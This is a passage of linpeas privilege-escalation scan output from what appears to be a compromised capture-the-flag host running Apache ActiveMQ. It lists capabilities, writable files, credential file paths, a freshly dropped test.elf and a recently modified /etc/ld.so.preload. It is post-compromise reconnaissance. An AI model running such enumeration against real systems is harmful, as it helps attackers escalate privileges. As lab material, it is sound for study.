CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

╚ Parent process capabilities
CapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:	 0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
total 28
drwxr-xr-x   2 root root 4096 Nov  6  2023 .
drwxr-xr-x 105 root root 4096 Nov  7  2023 ..
-rw-r--r--   1 root root   96 Oct 15  2021 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rw-r--r--   1 root root  726 Nov 15  2021 bash_completion.sh
-rw-r--r--   1 root root 1107 Mar 23  2022 gawk.csh
-rw-r--r--   1 root root  757 Mar 23  2022 gawk.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient
-rw-r--r-- 1 root root  3448 Mar 17  2022 usr.bin.man
-rw-r--r-- 1 root root  1518 Feb 10  2023 usr.bin.tcpdump
-rw-r--r-- 1 root root  1592 Nov 16  2021 usr.sbin.rsyslogd

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/activemq/.bash_history
/home/activemq/user.txt
/root/
/var/www
/var/www/html
/var/www/html/index.nginx-debian.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r----- 1 root activemq 33 May 14 17:08 /home/activemq/user.txt

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root activemq 33 May 14 17:08 /home/activemq/user.txt

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/home/activemq
/opt/apache-activemq-5.15.15
/opt/apache-activemq-5.15.15/LICENSE
/opt/apache-activemq-5.15.15/NOTICE
/opt/apache-activemq-5.15.15/README.txt
/opt/apache-activemq-5.15.15/activemq-all-5.15.15.jar
/opt/apache-activemq-5.15.15/bin
/opt/apache-activemq-5.15.15/bin/activemq
/opt/apache-activemq-5.15.15/bin/activemq-diag
/opt/apache-activemq-5.15.15/bin/activemq.jar
/opt/apache-activemq-5.15.15/bin/env
/opt/apache-activemq-5.15.15/bin/linux-x86-32
/opt/apache-activemq-5.15.15/bin/linux-x86-32/activemq
/opt/apache-activemq-5.15.15/bin/linux-x86-32/libwrapper.so
/opt/apache-activemq-5.15.15/bin/linux-x86-32/wrapper
/opt/apache-activemq-5.15.15/bin/linux-x86-32/wrapper.conf
/opt/apache-activemq-5.15.15/bin/linux-x86-64
/opt/apache-activemq-5.15.15/bin/linux-x86-64/activemq
/opt/apache-activemq-5.15.15/bin/linux-x86-64/libwrapper.so
/opt/apache-activemq-5.15.15/bin/linux-x86-64/wrapper
/opt/apache-activemq-5.15.15/bin/linux-x86-64/wrapper.conf
/opt/apache-activemq-5.15.15/bin/macosx
/opt/apache-activemq-5.15.15/bin/macosx/activemq
/opt/apache-activemq-5.15.15/bin/macosx/libwrapper.jnilib
/opt/apache-activemq-5.15.15/bin/macosx/wrapper
/opt/apache-activemq-5.15.15/bin/macosx/wrapper.conf
/opt/apache-activemq-5.15.15/bin/test.elf
/opt/apache-activemq-5.15.15/bin/wrapper.jar
/opt/apache-activemq-5.15.15/conf
/opt/apache-activemq-5.15.15/conf/activemq.xml
/opt/apache-activemq-5.15.15/conf/broker-localhost.cert
/opt/apache-activemq-5.15.15/conf/broker.ks
/opt/apache-activemq-5.15.15/conf/broker.ts
/opt/apache-activemq-5.15.15/conf/client.ks

/opt/apache-activemq-5.15.15/data
/opt/apache-activemq-5.15.15/data/activemq.log
/opt/apache-activemq-5.15.15/data/activemq.pid
/opt/apache-activemq-5.15.15/data/activemq.pid.stop
/opt/apache-activemq-5.15.15/data/audit.log
/opt/apache-activemq-5.15.15/data/kahadb
/opt/apache-activemq-5.15.15/data/kahadb/db-1.log
/opt/apache-activemq-5.15.15/data/kahadb/db.data
/opt/apache-activemq-5.15.15/data/kahadb/db.redo
/opt/apache-activemq-5.15.15/data/kahadb/lock
/opt/apache-activemq-5.15.15/docs
/opt/apache-activemq-5.15.15/docs/WebConsole-README.txt
/opt/apache-activemq-5.15.15/docs/index.html
/opt/apache-activemq-5.15.15/docs/user-guide.html
/opt/apache-activemq-5.15.15/examples
/opt/apache-activemq-5.15.15/examples/amqp
/opt/apache-activemq-5.15.15/examples/amqp/java
/opt/apache-activemq-5.15.15/examples/amqp/java/pom.xml
/opt/apache-activemq-5.15.15/examples/amqp/java/readme.md
/opt/apache-activemq-5.15.15/examples/amqp/java/src
/opt/apache-activemq-5.15.15/examples/amqp/java/src/main
/opt/apache-activemq-5.15.15/examples/amqp/java/src/main/java
/opt/apache-activemq-5.15.15/examples/amqp/java/src/main/java/example
/opt/apache-activemq-5.15.15/examples/amqp/java/src/main/java/example/Listener.java
/opt/apache-activemq-5.15.15/examples/amqp/java/src/main/java/example/Publisher.java
/opt/apache-activemq-5.15.15/examples/amqp/python
/opt/apache-activemq-5.15.15/examples/amqp/python/address.py
/opt/apache-activemq-5.15.15/examples/amqp/python/content.py
/opt/apache-activemq-5.15.15/examples/amqp/python/readme.md
/opt/apache-activemq-5.15.15/examples/amqp/python/receiver.py
/opt/apache-activemq-5.15.15/examples/amqp/python/sender.py
/opt/apache-activemq-5.15.15/examples/conf
/opt/apache-activemq-5.15.15/examples/conf/activemq-demo.xml
/opt/apache-activemq-5.15.15/examples/conf/activemq-dynamic-network-broker1.xml
/opt/apache-activemq-5.15.15/examples/conf/activemq-dynamic-network-broker2.xml
/opt/apache-activemq-5.15.15/examples/conf/activemq-jdbc-performance.xml
/opt/apache-activemq-5.15.15/examples/conf/activemq-jdbc.xml

/opt/apache-activemq-5.15.15/examples/mqtt
/opt/apache-activemq-5.15.15/examples/mqtt/java
/opt/apache-activemq-5.15.15/examples/mqtt/java/pom.xml
/opt/apache-activemq-5.15.15/examples/mqtt/java/readme.md
/opt/apache-activemq-5.15.15/examples/mqtt/java/src
/opt/apache-activemq-5.15.15/examples/mqtt/java/src/main
/opt/apache-activemq-5.15.15/examples/mqtt/java/src/main/java
/opt/apache-activemq-5.15.15/examples/mqtt/java/src/main/java/example
/opt/apache-activemq-5.15.15/examples/mqtt/java/src/main/java/example/Listener.java
/opt/apache-activemq-5.15.15/examples/mqtt/java/src/main/java/example/Publisher.java
/opt/apache-activemq-5.15.15/examples/mqtt/websocket
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/css
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/css/bootstrap.min.css
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/css/bootstrap.min.responsive.css
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/img
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/index.html
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/js
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/js/jquery-3.4.1.min.js
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/js/mqttws31.js
/opt/apache-activemq-5.15.15/examples/mqtt/websocket/readme.md
/opt/apache-activemq-5.15.15/examples/openwire
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src/main/java/example/composite
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src/main/java/example/composite/dest
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src/main/java/example/composite/dest/Consumer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-composite-destinations/src/main/java/example/composite/dest/Producer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src/main/java/example/topic
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src/main/java/example/topic/durable
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src/main/java/example/topic/durable/Publisher.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-durable-sub/src/main/java/example/topic/durable/Subscriber.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src/main/java/example/queue
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src/main/java/example/queue/exclusive
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src/main/java/example/queue/exclusive/Consumer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/src/main/java/example/queue/exclusive/Producer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/src/main/java/example/browser
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/src/main/java/example/browser/Browser.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-message-browser/src/main/java/example/browser/Producer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src/main/java/example/queue
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src/main/java/example/queue/selector
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src/main/java/example/queue/selector/Consumer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue-selector/src/main/java/example/queue/selector/Producer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main/java/example/queue
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main/java/example/queue/Consumer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main/java/example/queue/Producer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main/resources
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-queue/src/main/resources/log4j.properties
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/src/main/java/example/tempdest
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/src/main/java/example/tempdest/Consumer.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-temp-destinations/src/main/java/example/tempdest/ProducerRequestReply.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main/java/example/topic
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main/java/example/topic/Publisher.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main/java/example/topic/Subscriber.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main/resources
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-topic/src/main/resources/log4j.properties
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/src
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/src/main
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/src/main/java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/src/main/java/example
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/src/main/java/example/transaction
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-transaction/src/main/java/example/transaction/Client.java
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-wildcard-consumer
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-wildcard-consumer/pom.xml
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-wildcard-consumer/readme.md
/opt/apache-activemq-5.15.15/examples/openwire/advanced-scenarios/jms-example-wildcard-consumer/src

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files

                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-05-14+17:23:30.3199748100 /opt/apache-activemq-5.15.15/bin/test.elf
2023-11-06+01:10:55.9347837790 /usr/local/sbin/laurel
2023-04-27+15:41:36.7397629060 /etc/console-setup/cached_setup_terminal.sh
2023-04-27+15:41:36.7357629080 /etc/console-setup/cached_setup_keyboard.sh
2023-04-27+15:41:36.7357629080 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root     root     4096 Nov  6  2023 .
drwxr-xr-x 18 root     root     4096 Nov  6  2023 ..
drwxr-xr-x 11 activemq activemq 4096 Nov  6  2023 apache-activemq-5.15.15

╔══════════╣ Unexpected in root

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/etc/ld.so.preload
/home/activemq/.gnupg/pubring.kbx
/home/activemq/.gnupg/trustdb.gpg
/var/log/syslog
/var/log/auth.log
/var/log/kern.log
/var/log/journal/97985f393ecf4d86b4acd0b422f7d8c8/user-1000.journal
/var/log/journal/97985f393ecf4d86b4acd0b422f7d8c8/system.journal
/var/log/laurel/audit.log.1
/var/log/laurel/audit.log
/opt/apache-activemq-5.15.15/data/kahadb/db.redo
/opt/apache-activemq-5.15.15/data/kahadb/db.data

╔══════════╣ Files inside /home/activemq (limit 20)
total 860
drwxr-x--- 5 activemq activemq   4096 May 14 17:30 .
drwxr-xr-x 3 root     root       4096 Nov  6  2023 ..
lrwxrwxrwx 1 root     root          9 Nov  5  2023 .bash_history -> /dev/null
-rw-r--r-- 1 activemq activemq    220 Nov  5  2023 .bash_logout
-rw-r--r-- 1 activemq activemq   3771 Nov  5  2023 .bashrc
drwx------ 2 activemq activemq   4096 Nov  7  2023 .cache
drwx------ 3 activemq activemq   4096 May 14 17:30 .gnupg
drwxrwxr-x 3 activemq activemq   4096 Nov  7  2023 .local
-rw-r--r-- 1 activemq activemq    807 Nov  5  2023 .profile
-rwxr-xr-x 1 activemq activemq 840082 Mar  1 04:27 linpeas.sh
-rw-r----- 1 root     activemq     33 May 14 17:08 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/index.nginx-debian.html

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 Nov  7  2023 /var/backups
total 60
-rw-r--r-- 1 root root 41199 Nov  6  2023 apt.extended_states.0
-rw-r--r-- 1 root root  4450 Nov  6  2023 apt.extended_states.1.gz
-rw-r--r-- 1 root root  4330 Nov  5  2023 apt.extended_states.2.gz

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2403 Feb 17  2023 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 61 Nov  6  2023 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 0 Feb 17  2023 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-88/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 1802 Jul 20  2023 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1423 Nov  6  2023 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-310.pyc
-rw-r--r-- 1 root root 13081 Oct  2  2023 /usr/lib/modules/5.15.0-88-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 10849 Oct  2  2023 /usr/lib/modules/5.15.0-88-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 138 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 44008 Oct 27  2023 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 2747 Feb 16  2022 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 11849 Nov  6  2023 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rwxr-xr-x 1 root root 2196 Apr  1  2023 /usr/libexec/dpkg/dpkg-db-backup

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 837, cookie 0x4, schema 4, UTF-8, version-valid-for 5

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)

╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Nov  5  2023 .
drwxr-xr-x 13 root root 4.0K Nov  5  2023 ..
drwxr-xr-x  2 root root 4.0K Nov  5  2023 html

/var/www/html:
total 12K
drwxr-xr-x 2 root root 4.0K Nov  5  2023 .
drwxr-xr-x 3 root root 4.0K Nov  5  2023 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 May 14 17:08 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 0 Nov  5  2023 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 root root 0 Nov  5  2023 /etc/.java/.systemPrefs/.system.lock
-rw-r--r-- 1 root root 220 Jan  6  2022 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 17  2023 /etc/.pwd.lock
-rw-r--r-- 1 activemq activemq 220 Nov  5  2023 /home/activemq/.bash_logout
-rw-r--r-- 1 landscape landscape 0 Feb 17  2023 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 2670 Jul 24  2023 /usr/lib/jvm/.java-1.8.0-openjdk-amd64.jinfo

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/java-8-openjdk/management/jmxremote.password
/etc/pam.d/common-password
/opt/apache-activemq-5.15.15/conf/credentials-enc.properties
/opt/apache-activemq-5.15.15/conf/credentials.properties
/opt/apache-activemq-5.15.15/conf/jmx.password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/management/jmxremote.password
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential
